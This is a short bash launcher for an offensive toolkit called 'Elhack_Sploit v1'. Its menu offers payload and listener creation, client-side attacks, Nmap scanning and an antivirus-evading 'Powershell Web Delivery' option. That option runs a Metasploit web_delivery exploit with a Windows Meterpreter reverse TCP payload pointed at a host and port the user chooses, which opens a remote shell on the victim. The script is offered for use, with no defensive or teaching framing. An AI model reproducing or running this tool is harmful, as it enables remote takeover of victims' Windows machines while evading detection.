#!/bin/bash
#Email :hamza.geek@gmail.com 
clear
echo "===================================="
echo "[Elhack_Sploit v1]
      [--]code :Hamza.elhack [--]
      [--]fb :fb:fb.me/elhack.dz"
echo "===================================="
echo
sleep 2

echo " Select from the menu: "
echo
echo " 1) Create a Payload and Listener"
echo " 2) Client Side Attacks "
echo " 3) Nmap scanning tool "
echo " 4) Powershell Web Delivery [FUD] "
echo " 5) Exit"
echo
read elhack

if [[ $elhack == 1 ]]; then
clear
bash src/pay.sh
elif [[ $elhack == 2 ]]; then
clear
bash src/autpn.sh
elif [[ $elhack == 3 ]]; then
bash src/nm.sh
elif [[ $elhack == 4 ]]; then
clear
read -p "Local host : " ip
read -p "Local Port : " port

msfconsole -x "use exploit/multi/script/web_delivery; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; set TARGETS 2; exploit"

elif [[ $elhack == 5 ]]; then
clear
echo "good bye"
exit
else
bash elhack.sh
fi
